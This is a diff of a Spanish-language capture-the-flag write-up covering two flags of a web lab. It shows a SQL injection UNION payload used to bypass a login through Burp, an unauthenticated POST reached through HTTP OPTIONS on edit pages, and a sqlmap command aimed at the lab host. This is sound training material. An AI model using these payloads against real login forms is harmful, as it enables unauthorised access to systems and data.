@@ -1,5 +1,7 @@
 # Nivel 3
 
+## WriteUp: Flag 1
+
 Ahora mejorada la seguridad del sitio piden login para editar.
 
 Para atacar le tire una lista enorme a usuario y pass. Me lanza esto:
@@ -17,17 +19,55 @@ Entonces enumeremos ahi tenemos una query y ambos motores mysql y mariadb. Desde
 
 ![](../../.gitbook/assets/imagen%20%28725%29.png)
 
-Sigue generando el error asi que probemos con otra tool.
+Estudiando el error que lanza 
 
-Le tiramos desde **sqlmap** la siguiente query
+```text
+SELECT password FROM admins WHERE username=\'%s\'' ....
+```
+
+Esto puede convertirse en un ataque de union donde elegimos que colocar del lado del usuario de cerrar las etiquetas
+
+```text
+SELECT password FROM admins WHERE username='' UNION SELECT "AAA" AS password WHERE '1' = '1'
+```
+
+En el burp lanzando el siguiente POST:
+
+`username='UNION SELECT '123' AS password FROM admins WHERE '1' = '1&password=123`
+
+Con eso logramos acceder a la 1er flag
+
+## Flag 2: metodos http
+
+_\(This flag was absolute bs\)_
+
+Recomendado este motor online para peticiones http [https://httpie.io/run](https://httpie.io/run) 
+
+Viendo que podemos utilizar http OPTIONS estando logeados las paginas de edicion permiten el post directamente, permitiendo que un atacante cree una pagina sin estar logeado
+
+Haciendo OPTIONS http://35.196.135.216:5001/5022561f51/page/edit/3
+
+```text
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 16 Aug 2021 18:16:50 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Connection: close
+Allow: HEAD, GET, POST, OPTIONS
+```
+
+Desde nuestro cliente externo hacemos el POST
+
+![](../../.gitbook/assets/imagen%20%28929%29.png)
+
+## Extra: pruebas con SQLMAP
 
 ```text
 sqlmap -u http://35.190.155.168/5a75132eac/login --data "username=&password=" --dbms mysql
 ```
 
 ![](../../.gitbook/assets/imagen%20%28726%29.png)
-
-![](../../.gitbook/assets/imagen%20%28724%29.png)
 
 ```text
 Parameter: username (POST)
